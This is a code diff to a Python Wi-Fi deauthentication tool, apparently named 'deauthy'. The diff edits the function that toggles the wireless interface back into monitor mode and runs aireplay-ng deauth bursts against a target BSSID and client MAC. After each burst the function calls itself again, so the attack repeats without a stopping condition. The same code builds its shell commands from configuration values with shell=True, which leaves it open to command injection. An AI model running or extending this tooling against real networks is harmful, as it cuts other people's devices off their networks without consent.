@@ -152,19 +152,24 @@ class Functs:
     class BSSID_METHOD:
         def deauth(_bssid: BSSID, spinner):
             from deauthy.functs import get_var
-
+            from halo import Halo
+            iface = get_var('interface')
+            with Halo(f"{Terminal.Light_green}(Re-enabling monitor Mode...") as spinner:
+                if Functs.is_in_monitor_mode(Interface(iface)):
+                    Functs.switch(Interface(iface), "managed", True)
+                    Functs.switch(Interface(iface), "monitor", True)
+                spinner.succeed(f"{Terminal.Light_green+Terminal.Bold}Re-enabled monitor mode{Terminal.End}")
             def ado_bssid_method(bssid_: str, channel: int):
                 Functs.ChannelSys.hopper(channel)
                 try:
-                    out = check_output(f"""aireplay-ng -0 2 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
+                    out = check_output(f"""aireplay-ng -0 2 -a {bssid_} -c {get_var('target_mac')} {iface}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                     print(out.decode())
                     if f", but the AP uses channel" in out.decode():
                         print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                 except KeyboardInterrupt:
-                    Functs.switch(Interface(get_var('interface')), "managed")
+                    Functs.switch(Interface(iface), "managed")
                     return "stop"
-                else:
-                    Functs.BSSID_METHOD.deauth(_bssid=_bssid, spinner=spinner)
+                Functs.BSSID_METHOD.deauth(_bssid=_bssid, spinner=spinner)
 
             for bssi, chan in _bssid.bssids.items():
                 status = ado_bssid_method(bssi, chan)
